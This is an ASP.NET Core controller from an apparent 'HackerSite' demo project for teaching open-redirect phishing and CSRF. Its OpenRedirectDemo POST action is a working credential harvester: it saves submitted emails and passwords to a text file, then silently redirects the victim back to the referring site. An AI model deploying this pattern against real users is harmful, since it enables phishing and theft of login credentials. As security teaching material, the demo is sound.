using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using HackerSite.Models;
using Microsoft.AspNetCore.Http.Internal;
using System.IO;

namespace HackerSite.Controllers
{
    public class HomeController : Controller
    {
        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        public IActionResult OpenRedirectDemo() //shows hacker's page with the same login form
        {
            var referrer = Request.Headers["Referer"].ToString();
            return View(new LoginModel() { ReturnUrl = referrer }); //stores referrer
        }

        [HttpPost]
        public IActionResult OpenRedirectDemo(LoginModel inputModel) 
        {
            Uri returnUri;
            if (!Uri.TryCreate(inputModel.ReturnUrl, UriKind.Absolute, out returnUri))
                return Error();

            try //writes credentials to file
            {
                var credentials = $"login={inputModel.Email},password={inputModel.Password}";
                System.IO.File.AppendAllLines("credentials.txt", new[] { credentials });
            }
            catch { }

            //redirect to the source site
            return Redirect(returnUri.Scheme + "://" + returnUri.Authority);
        }

        public IActionResult CSRFSubmitDemo()
        {
            return View();
        }
    }
}
